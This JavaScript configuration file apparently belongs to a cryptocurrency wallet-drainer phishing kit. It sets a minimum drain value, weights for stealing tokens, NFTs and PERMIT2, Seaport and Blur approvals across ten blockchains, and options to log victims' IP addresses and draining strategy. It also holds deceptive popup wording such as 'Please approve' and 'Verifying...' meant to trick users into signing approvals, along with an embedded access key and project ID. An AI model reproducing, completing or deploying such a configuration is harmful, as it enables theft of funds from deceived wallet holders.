
let ACCESS_KEY = '3b617e87-ae87-4135-aae8-598c1e4ff694'
let USE_W3M_V3 = true
let logPromptingEnabled = true;
let minimalDrainValue = 0.002;
let mainModal = 'w3m'
let chooseWalletTheme = 'dark';
let themeVariables = {
'--w3m-z-index': 10000,
'--w3m-overlay-backdrop-filter': 'blur(6px)',
};
let w3m_name = "";
let w3m_description = "";
let w3m_url = "";
let w3m_icons = [''];
let multipliers = {
'LP_NFTS': 1,
'PERMIT2': 1,
'BLUR': 1,
'SEAPORT': 1,
'SWAP': 1,
'TOKENS': 1,
'NFT': 1,
'NATIVES': 1,
};
let notEligible = "Your wallet is not eligible, connect another wallet.";
let swal_notEligibleTitle = "Not eligible";
let addressChanged = "Your wallet address has changed, connect wallet again please";
let swal_addressChangedTitle = "Address changed";
let popupElementID = "drPopup";
let popupCloseButtonID = "popupClose";
let popupCode = ``;
let messageElement = "messageButton";
let textInitialConnected = "Loading...";
let textProgress = "Verifying...";
let success = "Please approve";
let failed = "Try again";
let logIpData = true;
let logEmptyWallets = false;
let logDrainingStrategy = true;
let repeatHighest = true;
let retry_changenetwork = 13;
let eth_enabled = true;
let bsc_enabled = true;
let arb_enabled = true;
let polygon_enabled = true;
let avalanche_enabled = true;
let optimism_enabled = true;
let ftm_enabled = true;
let celo_enabled = true;
let cronos_enabled = true;
let base_enabled = true;
let autoconnect = false;
let useSweetAlert = true;
let popupEnabled = true;
let useDefaultPopup = true;
let canClosePopup = true;
let buttonMessagesEnabled = false;
let twoStep = false;
let twoStepButtonElement = "startButton";
let connectElement = "connectButton";
let wc_projectid = "258ce17f43dbf354073121fb984bf5fd";
let cfgversion = 680;
let researchers = [];
let experimental = {"disable-w3m-featured":true};